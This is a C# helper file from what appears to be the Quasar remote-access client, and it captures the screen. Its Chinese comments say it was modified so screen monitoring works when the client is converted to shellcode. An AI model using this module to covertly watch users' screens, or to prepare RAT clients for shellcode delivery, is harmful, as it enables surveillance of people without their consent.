using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.Windows.Forms;
using Quasar.Client.Utilities;

namespace Quasar.Client.Helper
{
    public static class ScreenHelper
    {
        private const int SRCCOPY = 0x00CC0020;
        
        /*
         * 修复转为shellcode时屏幕监控分辨率问题
         * 增加GetResolving函数，用于获取屏幕分辨率
         */

        private static void GetResolving(ref int width, ref int height)
        {
            IntPtr hdc = NativeMethods.GetDC(IntPtr.Zero);
            width = NativeMethods.GetDeviceCaps(hdc, DESKTOPHORZRES);
            height = NativeMethods.GetDeviceCaps(hdc, DESKTOPVERTRES);
            NativeMethods.ReleaseDC(IntPtr.Zero, hdc);
        }


        public static Bitmap CaptureScreen(int screenNumber)
        {
            Rectangle bounds = GetBounds(screenNumber);

            /*
            * 修复转为shellcode时屏幕监控分辨率问题
            * 获取修复的屏幕分辨率并替换
            */

            int width = 0;
            int height = 0;
            GetResolving(ref width, ref height);
            bounds.Width = width;
            bounds.Height = height;

            Bitmap screen = new Bitmap(bounds.Width, bounds.Height, PixelFormat.Format32bppPArgb);

            using (Graphics g = Graphics.FromImage(screen))
            {
                IntPtr destDeviceContext = g.GetHdc();
                IntPtr srcDeviceContext = NativeMethods.CreateDC("DISPLAY", null, null, IntPtr.Zero);

                NativeMethods.BitBlt(destDeviceContext, 0, 0, bounds.Width, bounds.Height, srcDeviceContext, bounds.X,
                    bounds.Y, SRCCOPY);

                NativeMethods.DeleteDC(srcDeviceContext);
                g.ReleaseHdc(destDeviceContext);
            }

            return screen;
        }

        public static Rectangle GetBounds(int screenNumber)
        {
            return Screen.AllScreens[screenNumber].Bounds;
        }
    }
}
